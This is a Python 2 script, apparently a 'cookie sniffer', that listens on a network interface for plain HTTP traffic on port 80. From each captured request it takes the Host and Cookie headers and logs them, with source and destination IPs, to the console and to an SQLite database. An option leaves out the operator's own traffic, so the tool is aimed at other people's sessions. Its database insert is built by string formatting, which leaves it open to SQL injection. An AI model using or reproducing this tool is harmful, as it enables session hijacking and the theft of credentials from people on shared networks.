#!/usr/bin/env python2

import pcap
import sys
import socket
import struct
import re
import datetime
import sqlite3
import fcntl
import time
from optparse import OptionParser

protocols = {socket.IPPROTO_TCP: 'tcp',
           socket.IPPROTO_UDP: 'udp',
           socket.IPPROTO_ICMP: 'icmp'}


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])


def decode_ip_packet(s):
    d = {}
    d['version'] = (ord(s[0]) & 0xf0) >> 4
    d['header_len'] = ord(s[0]) & 0x0f
    d['tos'] = ord(s[1])
    d['total_len'] = socket.ntohs(struct.unpack('H', s[2:4])[0])
    d['id'] = socket.ntohs(struct.unpack('H', s[4:6])[0])
    d['flags'] = (ord(s[6]) & 0xe0) >> 5
    d['fragment_offset'] = socket.ntohs(struct.unpack('H', s[6:8])[0] & 0x1f)
    d['ttl'] = ord(s[8])
    d['protocol'] = ord(s[9])
    d['checksum'] = socket.ntohs(struct.unpack('H', s[10:12])[0])
    d['source_address'] = pcap.ntoa(struct.unpack('i', s[12:16])[0])
    d['destination_address'] = pcap.ntoa(struct.unpack('i', s[16:20])[0])
    if d['header_len'] > 5:
        d['options'] = s[20:4 * (d['header_len'] - 5)]
    else:
        d['options'] = None
    d['data'] = s[4 * d['header_len']:]
    return d


# def dumphex(s):
#     bytes = map(lambda x: '%.2x' % x, map(ord, s))
#     for i in xrange(0, len(bytes) / 16):
#         print '    %s' % string.join(bytes[i * 16:(i + 1) * 16], ' ')
#     print '    %s' % string.join(bytes[(i + 1) * 16:], ' ')


class myhttpdump():
    def __init__(self):
        self.header_host = ''
        self.header_cookie = ''

    def dumphex(self, decoded):
        bytes = map(lambda x: '%.2x' % x, map(ord, decoded['data']))

        strings = ''
        for i in bytes:
            strings = strings + i.decode('hex')

        # if 'Host' in string:
        #     print string

        re_host = re.compile(r"Host: (.*)")
        re_cookie = re.compile(r"Cookie: (.*)")

        # for data in binascii.unhexlify(''.join(bytes[0:len(bytes)])).split('\r\n'):
        for data in strings.split('\r\n'):
            if re_host.search(data):
                self.header_host = re_host.search(data).group(1)
            elif re_cookie.search(data):
                self.header_cookie = re_cookie.search(data).group(1)

                return {'src_ip': decoded['source_address'], 'dest_ip': decoded['destination_address'], 'host': self.header_host, 'cookie': self.header_cookie}


def print_packet(pktlen, data, timestamp):
    if not data:
        return
    else:
    # if data[12:14]=='\x08\x00':
        decoded = decode_ip_packet(data[14:])
        _datetime = time.strftime("%Y/%m/%d %H:%M:%S", time.localtime(timestamp))
        # print '\n%s.%f %s > %s' % (time.strftime('%H:%M', time.localtime(timestamp)), timestamp % 60, decoded['source_address'], decoded['destination_address'])
        # for key in ['version', 'header_len', 'tos', 'total_len', 'id', 'flags', 'fragment_offset', 'ttl']:
        #   print '  %s: %d' % (key, decoded[key])
        #   print '  protocol: %s' % protocols[decoded['protocol']]
        #   print '  header checksum: %d' % decoded['checksum']
        #   print '  data:'
        #    dumphex(decoded['data'])

        http = myhttpdump()
        http_decoded = http.dumphex(decoded)

        if http_decoded:
            d = http_decoded
            if not (options.no_log_me and d['src_ip'] == get_ip_address(options.iface)):
                print '%s [%s > %s]' % (_datetime, d['src_ip'], d['dest_ip'])
                print 'Host: %s' % d['host']
                print 'Cookie: %s\n\n' % d['cookie']

                conn = sqlite3.connect('cookie_sniffer.db')
                cursor = conn.cursor()
                cursor.execute("INSERT INTO http_data (source_ip, destination_ip, host, cookie, datetime) VALUES ('%s', '%s', '%s', '%s', '%s');" % (d['src_ip'], d['dest_ip'], d['host'], d['cookie'], _datetime))
                conn.commit()
                conn.close()


if __name__ == '__main__':
    parser = OptionParser('%prog -i interface >> outputfile')
    parser.add_option("-i", "--iface", dest="iface", action="store", help="monitor on the specified interface")
    parser.add_option("--no-log-me", dest="no_log_me", action="store_true", default=False, help="don't log local traffice")
    (options, args) = parser.parse_args()

    if options.iface:
        p = pcap.pcapObject()
        dev = options.iface
        # comment follow line for open monitor device
        #net, mask = pcap.lookupnet(dev)
        p.open_live(dev, 1600, 0, 100)
        filter_string = 'port 80'
        p.setfilter(filter_string, 0, 0)

        try:
            while 1:
                p.dispatch(1, print_packet)
        except KeyboardInterrupt:
            print '%s' % sys.exc_type
            print 'shutting down'
            print '%d packets received, %d packets dropped, %d packets dropped by interface' % p.stats()
    else:
        print parser.get_usage()

exit(1)
